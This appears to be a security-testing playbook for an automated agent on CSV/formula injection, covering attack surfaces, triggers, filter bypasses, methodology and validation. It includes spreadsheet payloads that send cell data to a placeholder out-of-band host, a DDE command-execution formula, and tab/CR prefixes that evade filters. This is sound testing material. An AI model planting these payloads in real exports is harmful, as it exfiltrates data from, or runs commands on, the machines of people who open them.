---
name: csv-injection
description: CSV / formula (spreadsheet) injection — a user-controlled value stored by the app and later emitted into an exported CSV/TSV/XLSX that a victim opens in Excel/Sheets/LibreOffice, where a leading =/+/-/@ (or a tab/CR prefix) makes the cell a live formula (DDE/HYPERLINK/WEBSERVICE → data exfiltration or command execution on the victim's machine). The inject point and the sink (the export, opened elsewhere) are different requests and a different actor — classic second-order, systematically missed by single-request testing.
---

# CSV / Formula Injection

A stored, second-order client-side-execution bug. The app accepts a field
(name, address, note, coupon, filename, anything), stores it, and later an
operator or another user **exports** a report containing that field as CSV/
TSV/XLSX. When the victim opens the export in a spreadsheet, a cell beginning
with a formula trigger is evaluated — not displayed as text. Impact lands on
the *victim's* machine, so this is cross-user by construction (cross-links
`second_order_injection.md` for the inject-here / fire-there discipline and
`idor.md`/`bfla.md` when the exporter is a higher-privileged actor).

## Attack Surface

- Any field that is both user-controlled on input **and** reaches an export:
  profile fields, display names, addresses, order notes, support-ticket bodies,
  coupon codes, uploaded filenames, device names, tags, CSV/bulk-import
  round-trips (import your own value, it comes back in an admin export).
- Admin/operator dashboards with "Export to CSV/Excel", analytics/report
  downloads, invoice/statement exports, audit-log exports, "download my data"
  (GDPR) endpoints.
- Email/notification pipelines that build a CSV attachment.

## Formula Triggers

A cell is treated as a formula when it begins with one of:

- `=`  `+`  `-`  `@`  — the four classic leading characters.
- A leading **tab** (`0x09`), **carriage return** (`0x0D`), or in some apps a
  leading space before `=` — used to bypass naive "strip leading `=`" filters.

Payloads (escalating, never run a destructive one against a real victim):

- **Benign proof (use this first):** `=1+1` → cell shows `2`, proving evaluation
  without any outbound/command effect. This is the detection payload.
- **OOB data exfiltration (Excel/Sheets):**
  `=HYPERLINK("http://<oast>/?l="&A1,"click")` (requires a click),
  `=WEBSERVICE("http://<oast>/?d="&A1)` / `=IMPORTDATA("http://<oast>/?d="&A1)`
  (Sheets, auto-fetch) — pulls another cell's value to your collaborator.
- **DDE command execution (legacy Excel, needs the victim to accept prompts):**
  `=cmd|'/c calc'!A1` and the `+`/`-`/`@` variants. High-impact but
  interaction-heavy; the benign `=1+1` proof plus the exfil vector is usually
  the right report, with DDE noted as the escalation ceiling.

## Testing Methodology

1. **Map the round-trip.** Find a field you control that plausibly reaches an
   export (from the API contract / `client_bundle_analysis.md`, and from the
   recon inventory's export-looking routes). The inject request and the export
   request are different — record both.
2. **Inject the benign proof** (`=1+1`, and a tab-prefixed `\t=1+1` to test
   filter bypass) into the field as your own data.
3. **Trigger the export** — yourself if you can reach it, or (common) a
   higher-privileged actor's export view. If only an admin can export, this is a
   stored → admin-opens chain; provision/obtain the exporter's view or, if you
   cannot, record it as `needs_follow_up` with the exact field + export route.
4. **Open the exported file** and inspect the cell: does it render `2` (evaluated)
   or `=1+1` (stored as text / neutralized)? A sandbox `libreoffice --headless
   --convert-to csv` round-trip, or `python` opening the XLSX with `openpyxl` and
   checking whether the cell is a formula, confirms evaluation deterministically
   without a GUI.
5. **Confirm the filter boundary.** If `=1+1` is neutralized (prefixed with `'`,
   stripped, or quoted), retry the tab/CR/leading-space bypasses before
   concluding the control holds — a naive "strip leading =" is the common,
   bypassable control.

## Validation

- A finding requires the exported artifact to **evaluate** the injected cell (the
  `=1+1` → `2` proof, or a captured OAST hit from `WEBSERVICE`/`IMPORTDATA`), not
  merely that the raw value appears in the file. A value that lands verbatim and
  stays text is **not** a vulnerability.
- For the exfil/DDE escalation, an OAST callback (see `ssrf.md`'s OAST workflow /
  `run_oob_test`) or a demonstrated formula result is the proof; a payload that is
  stored but never opened/evaluated is `open_proof_gap`, not a finding.
- Name the victim context honestly: who exports, in which app. "Excel with DDE
  prompts accepted" is a weaker real-world victim than "Google Sheets auto-fetch
  via IMPORTDATA" — calibrate severity to the realistic victim per
  `analysis/severity_calibration.md`.

## False Positives

- The value is HTML/JS-escaped for a web view but that is irrelevant to a
  spreadsheet — test the *export*, not the web rendering.
- The app already prefixes a `'` / wraps every cell / uses a CSV writer that
  quotes and neutralizes formula leads (many modern libraries do) → not exploitable;
  confirm with the actual exported bytes.
- The "export" is a PDF/JSON/plain view no spreadsheet opens → out of scope for
  this class.

## Impact

Client-side on the victim who opens the export: data exfiltration of other cells
(often sensitive report data) to an attacker server, and — where DDE/legacy Excel
and user prompts align — command execution on the victim's workstation. Because
the victim is frequently an admin/analyst exporting a report of user-supplied
data, the blast radius is an internal operator, not just the attacker's own
account.

## Tooling

- Confirm evaluation without a GUI in the sandbox: `libreoffice --headless
  --convert-to csv <file>.xlsx` and diff the cell, or `python3 - <<'PY'` with
  `openpyxl.load_workbook(f)` checking `cell.data_type == 'f'`.
- Use `run_oob_test` / the OAST workflow for the `WEBSERVICE`/`IMPORTDATA` exfil
  callback correlation.

## Summary

Inject a formula-triggering value into a stored field, trigger the export,
open it elsewhere, and prove the cell **evaluates**. It is second-order and
cross-user — the inject point and the sink are different requests and often
different actors — so it is exactly the class single-request scanning misses.
Report with the evaluated proof and the realistic victim context; a value that
stays text is not a bug.
